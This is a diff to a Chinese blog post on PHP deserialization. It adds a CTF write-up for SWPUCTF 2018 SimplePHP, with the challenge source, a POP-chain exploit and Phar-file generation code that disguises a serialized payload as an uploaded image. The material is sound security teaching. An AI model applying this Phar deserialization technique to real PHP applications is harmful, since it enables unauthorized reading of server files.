@@ -1,7 +1,7 @@
 ---
 author: "Yiming Shen"
 date: 2022-06-11
-lastmod: 2022-07-07
+lastmod: 2022-07-08
 title: "PHP 反序列化"
 tags: [
     "CTF",
@@ -550,6 +550,171 @@ POST： `$_SESSION['flagflag']=";s:3:"abc";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=="
 ?>
 ```
 
+### [SWPUCTF 2018]SimplePHP
+
+本题考察知识点为
+
+- 文件包含
+- 利用Phar进行反序列化
+
+进入题目，发现存在一个文件包含和一个文件上传点，先利用文件包含读取`file.php`和`upload_file.php`的源代码，发现文件上传过滤严格，似乎不存在可以绕过的漏洞，只能上传图片格式。而`file.php`中还包含了`function.php`和`class.php`，第一个提示flag在`f1ag.php`中，第二个则明显是要进行POP链的构造。
+
+`class.php`内容
+
+```php
+<?php
+class C1e4r
+{
+    public $test;
+    public $str;
+    public function __construct($name)
+    {
+        $this->str = $name;
+    }
+    public function __destruct()
+    {
+        $this->test = $this->str;
+        echo $this->test;
+    }
+}
+
+class Show
+{
+    public $source;
+    public $str;
+    public function __construct($file)
+    {
+        $this->source = $file;   //$this->source = phar://phar.jpg
+        echo $this->source;
+    }
+    public function __toString()
+    {
+        $content = $this->str['str']->source;
+        return $content;
+    }
+    public function __set($key,$value)
+    {
+        // 在给不可访问（protected 或 private）或不存在的属性赋值时 调用Set
+        $this->$key = $value;
+    }
+    public function _show()
+    {
+        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
+            die('hacker!');
+        } else {
+            highlight_file($this->source);
+        }
+        
+    }
+    public function __wakeup()
+    {
+        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
+            echo "hacker~";
+            $this->source = "index.php";
+        }
+    }
+}
+class Test
+{
+    public $file;
+    public $params;
+    public function __construct()
+    {
+        $this->params = array();
+    }
+    public function __get($key)
+    {
+        return $this->get($key);
+    }
+    public function get($key)
+    {
+        if(isset($this->params[$key])) {
+            $value = $this->params[$key];
+        } else {
+            $value = "index.php";
+        }
+        return $this->file_get($value);
+    }
+    public function file_get($value)
+    {
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    }
+}
+?>
+```
+
+标注出所有魔术方法后，可以找到如下的POP链：
+
+`C1e4r.__destruct->Show.__set->Show.__toString->Test.params[$key]->Test.file_get`
+
+即可构造POP链
+
+```php
+<?php
+class C1e4r
+{
+    public $test;
+    public $str;
+}
+
+class Show
+{
+    public $source;
+    public $str;
+}
+
+class Test
+{
+    public $file;
+    public $params;
+}
+$c1e4r = new C1e4r();
+$show = new Show();
+$test = new Test();
+$c1e4r->str = $show;
+$show->str['str'] = $test;
+$test->params['source'] = 'f1ag.php';
+?>
+```
+
+但是，反序列化入口在哪里？所有的源代码中都没有反序列化函数`unserialize`
+
+#### Phar反序列化
+
+这时候，就要利用隐藏的反序列化入口-`Phar://`
+
+> `Phar`方法在 文件系统函数 （ file_get_contents 、 unlink 等）参数可控的情况下，配合 phar://伪协议 ，可以不依赖反序列化函数 unserialize() 直接进行反序列化的操作。
+
+PHP大部分的文件系统函数在通过`phar://`伪协议解析`phar`包文件时，都会将文件结构中`meta-data`的部分进行反序列化。
+
+同时， `phar `文件必须以`__HALT_COMPILER();?>`来结尾，那么**可以通过添加任意的文件头+修改后缀名的方式将`phar`文件伪装成其他格式的文件。**
+
+生成`Phar`包文件的代码是固定的：
+
+```php
+$phar = new Phar("exp.phar"); //生成.phar文件，此处填写的后缀名必须是.phar，但phar://协议不限于只解析.phar文件
+$phar->startBuffering();
+$phar->setStub('<?php __HALT_COMPILER(); ? >'); //固定的，可以在此处添加伪造的文件头
+$phar->setMetadata($c1e4r); //触发的头是C1e4r类，所以传入C1e4r对象，此处即为对$c1e4r进行序列化的操作
+$phar->addFromString("exp.txt", "test"); //随便写，生成签名
+$phar->stopBuffering();
+```
+
+完成后便会生成在同目录下生成一个`exp.phar`文件，手动修改文件拓展名为`.jpg`（之前查看`upload_file.php`源代码发现没有检查文件头，故更改文件后缀即可），上传，找到位置，在文件包含处使用`phar://`协议包含该jpg文件，即可通过POP链读取flag文件。
+
+#### Phar反序列化的条件
+
+根据该题，可以总结出需要满足以下三个条件：
+
+1. 需要存在POP链，末端可以获得flag的方法
+2. 需要文件上传入口，上传`phar`包
+3. 需要文件包含，利用`phar://`伪协议读取`phar`包
+
+除此之外，`Postgresql`和`Mysql`中也都有函数可以利用`phar://`伪协议进行反序列化操作。
+
+
+
 
 
 
@@ -559,7 +724,8 @@ POST： `$_SESSION['flagflag']=";s:3:"abc";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=="
 ## 参考
 
 1. [PHP反序列化和POP链构造 - As1def's Blog](https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/)
-2. [一题教你学会构造PHP反序列化POP链](https://www.freebuf.com/articles/web/247930.html)
+2. [一题教你学会构造PHP反序列化POP链 - FreeBuf](https://www.freebuf.com/articles/web/247930.html)
 3. [BUUCTF刷题——PHP反序列化 - CA01H' Blog](https://ca01h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
-4. [PHP 反序列化——字符逃逸](https://xz.aliyun.com/t/9213)
+4. [PHP 反序列化字符逃逸 - 先知社区](https://xz.aliyun.com/t/9213)
+5. [PHP反序列化拓展攻击Phar详解 - 先知社区](https://xz.aliyun.com/t/6699)
 
